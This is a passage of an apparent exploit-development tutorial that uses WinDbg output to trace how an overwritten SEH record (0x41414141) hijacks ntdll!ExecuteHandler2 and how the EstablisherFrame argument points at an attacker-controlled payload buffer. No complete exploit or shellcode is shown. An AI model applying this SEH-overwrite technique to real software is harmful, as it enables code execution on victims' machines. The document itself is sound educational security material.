+</span></span></code></pre></div><p>Once the breakpoint to the second exception handler has been triggered, let&rsquo;s inspect EIP to see more about this function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> u <span style="color:#960050;background-color:#1e0010">@</span>eip L11
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622</span>c <span style="color:#ae81ff">55</span>              push    ebp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622</span>d <span style="color:#ae81ff">8</span>bec            mov     ebp,esp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622f</span> ff750c          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316232</span> <span style="color:#ae81ff">52</span>              push    edx
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316233</span> <span style="color:#ae81ff">64ff</span><span style="color:#ae81ff">3500000000</span>  push    dword ptr fs:[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731623</span>a <span style="color:#ae81ff">64892500000000</span>  mov     dword ptr fs:[<span style="color:#ae81ff">0</span>],esp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316241</span> ff7514          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">14</span>h]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316244</span> ff7510          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>h]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316247</span> ff750c          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731624</span>a ff7508          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731624</span>d <span style="color:#ae81ff">8</span>b4d18          mov     ecx,dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316250</span> ffd1            call    ecx <span style="color:#75715e">// This ends calling 0x41414141, our handler function! 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">77316252</span> <span style="color:#ae81ff">648</span>b2500000000  mov     esp,dword ptr fs:[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316259</span> <span style="color:#ae81ff">648f</span><span style="color:#ae81ff">0500000000</span>  pop     dword ptr fs:[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316260</span> <span style="color:#ae81ff">8</span>be5            mov     esp,ebp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316262</span> <span style="color:#ae81ff">5</span>d              pop     ebp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316263</span> c21400          ret     <span style="color:#ae81ff">14</span>h
+</span></span></code></pre></div><p>The first thing worth mentioning in this code is that we are about to invoke a function by executing a “call ecx” instruction.
+According to the call stack that we say previously, after the call to ExecuteHandler2, we call the overwritten <code>_except_handler</code> function (0x41414141). Additionally, this function accepts four arguments as inferred from the four PUSH instructions preceding the “call ecx”. This matches the <code>_except_handler</code> function prototype, which is the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> EXCEPTION_DISPOSITION <span style="color:#a6e22e">_except_handler</span> (<span style="color:#f92672">*</span>PEXCEPTION_ROUTINE) (
+</span></span><span style="display:flex;"><span>IN PEXCEPTION_RECORD ExceptionRecord, 
+</span></span><span style="display:flex;"><span>IN VOID EstablisherFrame, 
+</span></span><span style="display:flex;"><span>IN OUT PCONTEXT ContextRecord, 
+</span></span><span style="display:flex;"><span>IN OUT PDISPATCHER_CONTEXT DispatcherContext );
+</span></span></code></pre></div><p>If we analyze more in depth this function, we can see that the &ldquo;ExceptionList&rdquo; pointer of the TEB is being updated with a new <code>_EXCEPTION_REGISTRATION_RECORD</code>structure, in order to manage exceptions that might occur during the call of the <code>_except_handler</code> function.
+If we continue the execution of the function, we can see that, after updating the TEB, the &ldquo;call&rdquo; instruction is being performed to our controlled address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> t
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">6f</span>db73da edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">7731624</span>d esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">444</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x21</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731624</span>d <span style="color:#ae81ff">8</span>b4d18          mov     ecx,dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h] ss:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">478</span><span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> t
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">77316250</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">444</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x24</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316250</span> ffd1            call    ecx {<span style="color:#ae81ff">41414141</span>}
+</span></span></code></pre></div><p>Once we have understood how to redirect code execution, we need to make it point to our payload.
+During a vanilla stack overflow, the attacker overwrites a return address, and consequently the EIP register, with the address of an instruction (like “jmp esp”) that can redirect the execution flow to the stack, where a payload is stored.
+However, in this scenario we <strong>do not control the stack when we gain control of the instruction pointer</strong>. Let&rsquo;s inspect ESP when we change the EIP:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> t
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">77316250</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">444</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x24</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316250</span> ffd1            call    ecx {<span style="color:#ae81ff">41414141</span>}
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dds esp L8
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">444</span>  <span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">540</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">448</span>  <span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">44</span>c  <span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">55</span>c
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">450</span>  <span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">4</span>cc
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">454</span>  <span style="color:#ae81ff">0175f</span>e0c
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">458</span>  <span style="color:#ae81ff">77316270</span> ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x44</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">45</span>c  <span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">460</span>  <span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">528</span>
+</span></span></code></pre></div><p>But let&rsquo;s inspect the four argument passed to the <code>_except_handler</code> function before calling it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> EXCEPTION_DISPOSITION <span style="color:#a6e22e">_except_handler</span> (<span style="color:#f92672">*</span>PEXCEPTION_ROUTINE) (
+</span></span><span style="display:flex;"><span>IN PEXCEPTION_RECORD ExceptionRecord, 
+</span></span><span style="display:flex;"><span>IN VOID EstablisherFrame, 
+</span></span><span style="display:flex;"><span>IN OUT PCONTEXT ContextRecord, 
+</span></span><span style="display:flex;"><span>IN OUT PDISPATCHER_CONTEXT DispatcherContext );
+</span></span></code></pre></div><p>The argument of interest is the <strong>EstablisherFrame</strong> argument, which is a pointer to the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure used to handle the exception. Remember we managed to overwrite the two parameters of this structure!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0090f</span>e0c
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0090ff44</span> _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x1008df5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x41414141</span> _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x41414141</span>     _EXCEPTION_DISPOSITION  <span style="color:#f92672">+</span><span style="color:#ae81ff">41414141</span>
+</span></span></code></pre></div><p>So if we managed to overwrite this structure, let&rsquo;s inspect how many bytes we managed to overwrite starting from such structure&rsquo;s address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
+</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">002</span><span style="color:#ae81ff">86000</span>
+</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">454</span>
+</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01760000</span>
+</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">0175e000</span>
+</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
+</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">002</span><span style="color:#ae81ff">86000</span>
+</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">000016</span>cc . <span style="color:#ae81ff">00000f</span><span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">0050</span>a108
+</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">0027</span><span style="color:#ae81ff">9000</span>
+</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
+</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">454</span>
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0175fe0c</span> _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x77316270</span>     _EXCEPTION_DISPOSITION  ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0x0175fe0c</span> 
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0175ff44</span> _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x0094df5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0x0175ff44</span> 
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x41414141</span> _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x41414141</span>     _EXCEPTION_DISPOSITION  <span style="color:#f92672">+</span><span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dds <span style="color:#ae81ff">0x0175ff44</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">48</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">54</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">58</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">5</span>c  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">60</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">64</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">68</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">6</span>c  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">70</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">74</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">78</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">7</span>c  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">80</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">84</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">88</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">8</span>c  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">90</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">94</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">98</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">9</span>c  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>a0  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>a4  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>a8  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>ac  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>b0  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>b4  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>b8  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>bc  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>c0  <span style="color:#ae81ff">41414141</span>
+</span></span></code></pre></div><p>As we can see, the pointer to our <code>_EXCEPTION_REGISTRATION_RECORD</code> stores an address to where our payload is located! We did not only override those bytes, but more bytes!
+So the same buffer that we used to overwrite the <code>_EXCEPTION_REGISTRATION_RECORD</code> to modify the EIP is the same that we will use to store our payload.</p>
+<p>Let&rsquo;s locate the section where we put the parameters of ExecuteHandler2 to see where our paramter of interest is located:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> u <span style="color:#960050;background-color:#1e0010">@</span>eip L11
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622</span>c <span style="color:#ae81ff">55</span>              push    ebp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622</span>d <span style="color:#ae81ff">8</span>bec            mov     ebp,esp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622f</span> ff750c          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316232</span> <span style="color:#ae81ff">52</span>              push    edx
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316233</span> <span style="color:#ae81ff">64ff</span><span style="color:#ae81ff">3500000000</span>  push    dword ptr fs:[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731623</span>a <span style="color:#ae81ff">64892500000000</span>  mov     dword ptr fs:[<span style="color:#ae81ff">0</span>],esp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316241</span> ff7514          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">14</span>h]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316244</span> ff7510          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>h]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316247</span> ff750c          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch] <span style="color:#75715e">// This is the EstablisherFrame address 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">7731624</span>a ff7508          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731624</span>d <span style="color:#ae81ff">8</span>b4d18          mov     ecx,dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316250</span> ffd1            call    ecx <span style="color:#75715e">// This ends calling 0x41414141, our handler function! 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">77316252</span> <span style="color:#ae81ff">648</span>b2500000000  mov     esp,dword ptr fs:[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316259</span> <span style="color:#ae81ff">648f</span><span style="color:#ae81ff">0500000000</span>  pop     dword ptr fs:[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316260</span> <span style="color:#ae81ff">8</span>be5            mov     esp,ebp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316262</span> <span style="color:#ae81ff">5</span>d              pop     ebp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316263</span> c21400          ret     <span style="color:#ae81ff">14</span>h
+</span></span></code></pre></div><p>Indeed, if we inspect that address, we will find that is is the location of our shellcode:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> t
